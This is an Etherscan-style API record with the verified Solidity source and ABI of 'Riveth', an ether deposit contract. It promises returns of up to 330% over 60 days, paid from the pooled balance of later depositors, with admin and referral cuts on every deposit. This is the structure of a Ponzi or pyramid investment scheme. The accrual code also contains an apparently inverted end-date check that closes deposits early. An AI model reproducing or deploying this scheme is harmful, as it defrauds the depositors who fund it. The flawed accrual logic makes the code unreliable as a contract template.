{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.24;\r\n\r\n\r\nlibrary SafeMath {\r\n\r\n  /**\r\n  * @dev Multiplies two numbers, reverts on overflow.\r\n  */\r\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\r\n    // benefit is lost if 'b' is also tested.\r\n    // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522\r\n    if (a == 0) {\r\n      return 0;\r\n    }\r\n\r\n    uint256 c = a * b;\r\n    require(c / a == b);\r\n\r\n    return c;\r\n  }\r\n\r\n  /**\r\n  * @dev Integer division of two numbers truncating the quotient, reverts on division by zero.\r\n  */\r\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    require(b > 0); // Solidity only automatically asserts when dividing by 0\r\n    uint256 c = a / b;\r\n    // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n\r\n    return c;\r\n  }\r\n\r\n  /**\r\n  * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).\r\n  */\r\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    require(b <= a);\r\n    uint256 c = a - b;\r\n\r\n    return c;\r\n  }\r\n\r\n  /**\r\n  * @dev Adds two numbers, reverts on overflow.\r\n  */\r\n  function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    uint256 c = a + b;\r\n    require(c >= a);\r\n\r\n    return c;\r\n  }\r\n\r\n  /**\r\n  * @dev Divides two numbers and returns the remainder (unsigned integer modulo),\r\n  * reverts when dividing by zero.\r\n  */\r\n  function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    require(b != 0);\r\n    return a % b;\r\n  }\r\n}\r\n\r\nlibrary AddressUtils {\r\n    function isContract(address _addr) internal view returns (bool) {\r\n        uint256 size;\r\n        assembly {size := extcodesize(_addr)}\r\n        return size > 0;\r\n    }\r\n}\r\n\r\nlibrary Helpers {\r\n    function walletFromData(bytes data) internal pure returns (address wallet) {\r\n        assembly {\r\n            wallet := mload(add(data, 20))\r\n        }\r\n    }\r\n}\r\n\r\ncontract Riveth {\r\n    using SafeMath for uint256;\r\n    using AddressUtils for address;\r\n\r\n    address public adminWallet;\r\n\r\n    uint256 constant public DEPOSIT_MIN = 10 finney;\r\n    uint256 constant public DEPOSIT_MAX = 50 ether;\r\n    uint256 constant public DEPOSIT_PERIOD = 60 days;\r\n    uint256 constant public DEPOSIT_COUNT_LIMIT = 5;\r\n    uint256 constant public TOTAL_BASE_PERCENT = 120;\r\n    uint256 constant public UPLINE_BASE_PERCENT = 5;\r\n    uint256 constant public UPLINE_MIN_DEPOSIT = 10 finney;\r\n    uint256 constant public EXPENSES_PERCENT = 10;\r\n\r\n    uint256 public totalDeposited = 0;\r\n    uint256 public totalWithdrawn = 0;\r\n    uint256 public usersCount = 0;\r\n    uint256 public depositsCount = 0;\r\n\r\n    mapping(address => User) public users;\r\n    mapping(uint256 => Deposit) public deposits;\r\n\r\n    struct Deposit {\r\n        uint256 createdAt;\r\n        uint256 endAt;\r\n        uint256 amount;\r\n        uint256 accrued;\r\n        bool active;\r\n    }\r\n\r\n    struct User {\r\n        uint256 createdAt;\r\n        address upline;\r\n        uint256 totalDeposited;\r\n        uint256 totalWithdrawn;\r\n        uint256 activeDepositsCount;\r\n        uint256 activeDepositsAmount;\r\n        uint256[] deposits;\r\n    }\r\n\r\n    modifier onlyAdmin() {\r\n        require(msg.sender == adminWallet);\r\n        _;\r\n    }\r\n\r\n    constructor() public {\r\n        adminWallet = msg.sender;\r\n        createUser(msg.sender, address(0));\r\n    }\r\n\r\n    function createUser(address wallet, address upline) internal {\r\n        users[wallet] = User({\r\n            createdAt : now,\r\n            upline : upline,\r\n            totalDeposited : 0,\r\n            totalWithdrawn : 0,\r\n            activeDepositsCount : 0,\r\n            activeDepositsAmount : 0,\r\n            deposits : new uint256[](0)\r\n            });\r\n        usersCount++;\r\n    }\r\n\r\n    function createDeposit() internal {\r\n        User storage user = users[msg.sender];\r\n        uint256 amount = msg.value;\r\n\r\n        Deposit memory deposit = Deposit({\r\n            createdAt : now,\r\n            endAt : now.add(DEPOSIT_PERIOD),\r\n            amount : amount,\r\n            accrued : 0,\r\n            active : true\r\n        });\r\n\r\n        deposits[depositsCount] = deposit;\r\n        user.deposits.push(depositsCount);\r\n\r\n        user.totalDeposited = user.totalDeposited.add(amount);\r\n        totalDeposited = amount.add(totalDeposited);\r\n\r\n        depositsCount++;\r\n        user.activeDepositsCount++;\r\n        user.activeDepositsAmount = user.activeDepositsAmount.add(amount);\r\n\r\n        adminWallet.transfer(amount.mul(EXPENSES_PERCENT).div(100));\r\n\r\n        uint256 uplineFee = amount.mul(UPLINE_BASE_PERCENT).div(100);\r\n        transferUplineFee(uplineFee);\r\n    }\r\n\r\n    function transferUplineFee(uint256 amount) internal {\r\n        User storage user = users[msg.sender];\r\n        \r\n        if (user.upline != address(0)) {\r\n            user.upline.transfer(amount);\r\n        }\r\n    }\r\n\r\n    function getUpline() internal view returns (address){\r\n        address uplineWallet = Helpers.walletFromData(msg.data);\r\n\r\n        return users[uplineWallet].createdAt > 0 \r\n        && users[uplineWallet].totalDeposited >= UPLINE_MIN_DEPOSIT \r\n        && msg.sender != uplineWallet\r\n        ? uplineWallet\r\n        : adminWallet;\r\n    }\r\n\r\n    function() payable public {\r\n        require(msg.sender != address(0), 'Address incorrect');\r\n        require(!msg.sender.isContract(), 'Address is contract');\r\n        require(msg.value <= DEPOSIT_MAX, 'Amount too big');\r\n\r\n        User storage user = users[msg.sender];\r\n\r\n        if (user.createdAt == 0) {\r\n            createUser(msg.sender, getUpline());\r\n        }\r\n\r\n        if (msg.value >= DEPOSIT_MIN) {\r\n            require(user.activeDepositsCount < DEPOSIT_COUNT_LIMIT, 'Active deposits count limit');\r\n            createDeposit();\r\n        } else {\r\n            accrueDeposits();\r\n        }\r\n    }\r\n\r\n    function accrueDeposits() internal {\r\n        User storage user = users[msg.sender];\r\n\r\n        for (uint i = 0; i < user.deposits.length; i++) {\r\n            if(deposits[user.deposits[i]].active){\r\n                accrueDeposits(user.deposits[i]);\r\n            }\r\n        }\r\n    }\r\n\r\n    function accrueDeposits(uint256 depositId) internal {\r\n        User storage user = users[msg.sender];\r\n        Deposit storage deposit = deposits[depositId];\r\n        uint256 amount = getAccrualAmount(depositId);\r\n\r\n        withdraw(msg.sender, amount);\r\n\r\n        deposit.accrued = deposit.accrued.add(amount);\r\n\r\n        if (deposit.endAt >= now) {\r\n            deposit.active = false;\r\n            user.activeDepositsCount--;\r\n            user.activeDepositsAmount = user.activeDepositsAmount.sub(deposit.amount);\r\n        }\r\n    }\r\n\r\n    function getAccrualAmount(uint256 depositId) internal view returns (uint256){\r\n        Deposit storage deposit = deposits[depositId];\r\n        uint256 totalProfit = totalForAccrual(msg.sender, depositId);\r\n        uint256 amount = totalProfit\r\n        .mul(\r\n            now.sub(deposit.createdAt)\r\n        )\r\n        .div(DEPOSIT_PERIOD)\r\n        .sub(deposit.accrued);\r\n\r\n        if (amount.add(deposit.accrued) > totalProfit) {\r\n            amount = totalProfit.sub(deposit.accrued);\r\n        }\r\n        return amount;\r\n    }\r\n\r\n\r\n    function withdraw(address wallet, uint256 amount) internal {\r\n        wallet.transfer(amount);\r\n        totalWithdrawn = totalWithdrawn.add(amount);\r\n        users[wallet].totalWithdrawn = users[wallet].totalWithdrawn.add(amount);\r\n    }\r\n\r\n    function getUserDeposits(address _address) public view returns (uint256[]){\r\n        return users[_address].deposits;\r\n    }\r\n\r\n    function getGlobalPercent() public view returns (uint256){\r\n        uint256 balance = address(this).balance;\r\n        if(balance >= 5000 ether){\r\n            //5.5% daily\r\n            return 330;\r\n        }\r\n        if(balance >= 3000 ether){\r\n            //5% daily\r\n            return 300;\r\n        }\r\n        if(balance >= 1000 ether){\r\n            //4.5% daily\r\n            return 270;\r\n        }\r\n        if(balance >= 500 ether){\r\n            //4% daily\r\n            return 240;\r\n        }\r\n        if(balance >= 200 ether){\r\n            //3.5% daily\r\n            return 210;\r\n        }\r\n        if(balance >= 100 ether){\r\n            //3% daily\r\n            return 180;\r\n        }\r\n        if(balance >= 50 ether){\r\n            //2.5% daily\r\n            return 150;\r\n        }\r\n        return TOTAL_BASE_PERCENT;\r\n    }\r\n\r\n    function getLocalPercent() public view returns (uint256){\r\n        return getLocalPercent(msg.sender);\r\n    }\r\n\r\n    function getLocalPercent(address user) public view returns (uint256){\r\n        uint256 activeDepositsAmount = users[user].activeDepositsAmount;\r\n        if(activeDepositsAmount >= 250 ether){\r\n            //5.5% daily\r\n            return 330;\r\n        }\r\n        if(activeDepositsAmount >= 150 ether){\r\n            //5% daily\r\n            return 300;\r\n        }\r\n        if(activeDepositsAmount >= 50 ether){\r\n            //4.5% daily\r\n            return 270;\r\n        }\r\n        if(activeDepositsAmount >= 25 ether){\r\n            //4% daily\r\n            return 240;\r\n        }\r\n        if(activeDepositsAmount >= 10 ether){\r\n            //3.5% daily\r\n            return 210;\r\n        }\r\n        if(activeDepositsAmount >= 5 ether){\r\n            //3% daily\r\n            return 180;\r\n        }\r\n        if(activeDepositsAmount >= 3 ether){\r\n            //2.5% daily\r\n            return 150;\r\n        }\r\n\r\n        return TOTAL_BASE_PERCENT;\r\n    }\r\n\r\n    function getIndividualPercent() public view returns (uint256){\r\n        return getIndividualPercent(msg.sender);\r\n    }\r\n\r\n    function getIndividualPercent(address user) public view returns (uint256){\r\n        uint256 globalPercent = getGlobalPercent();\r\n        uint256 localPercent = getLocalPercent(user);\r\n        return globalPercent >= localPercent ? globalPercent : localPercent;\r\n    }\r\n    \r\n    function totalForAccrual(address user, uint256 depositId) public view returns (uint256){\r\n        return deposits[depositId].amount.mul(getIndividualPercent(user)).div(100);\r\n    }\r\n}","ABI":"[{\"constant\":true,\"inputs\":[{\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"getUserDeposits\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256[]\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"user\",\"type\":\"address\"}],\"name\":\"getIndividualPercent\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"adminWallet\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"depositsCount\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getIndividualPercent\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalWithdrawn\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"DEPOSIT_MAX\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"usersCount\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"UPLINE_BASE_PERCENT\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"user\",\"type\":\"address\"}],\"name\":\"getLocalPercent\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"UPLINE_MIN_DEPOSIT\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"users\",\"outputs\":[{\"name\":\"createdAt\",\"type\":\"uint256\"},{\"name\":\"upline\",\"type\":\"address\"},{\"name\":\"totalDeposited\",\"type\":\"uint256\"},{\"name\":\"totalWithdrawn\",\"type\":\"uint256\"},{\"name\":\"activeDepositsCount\",\"type\":\"uint256\"},{\"name\":\"activeDepositsAmount\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"deposits\",\"outputs\":[{\"name\":\"createdAt\",\"type\":\"uint256\"},{\"name\":\"endAt\",\"type\":\"uint256\"},{\"name\":\"amount\",\"type\":\"uint256\"},{\"name\":\"accrued\",\"type\":\"uint256\"},{\"name\":\"active\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getGlobalPercent\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getLocalPercent\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"user\",\"type\":\"address\"},{\"name\":\"depositId\",\"type\":\"uint256\"}],\"name\":\"totalForAccrual\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"EXPENSES_PERCENT\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"DEPOSIT_COUNT_LIMIT\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"DEPOSIT_MIN\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"TOTAL_BASE_PERCENT\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"DEPOSIT_PERIOD\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalDeposited\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"Riveth","CompilerVersion":"v0.4.25+commit.59dbf8f1","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://e72684110386f21de35b20fa985f3b2d1bb8846bd5649b2015e5fe47dc88f8ab"}]}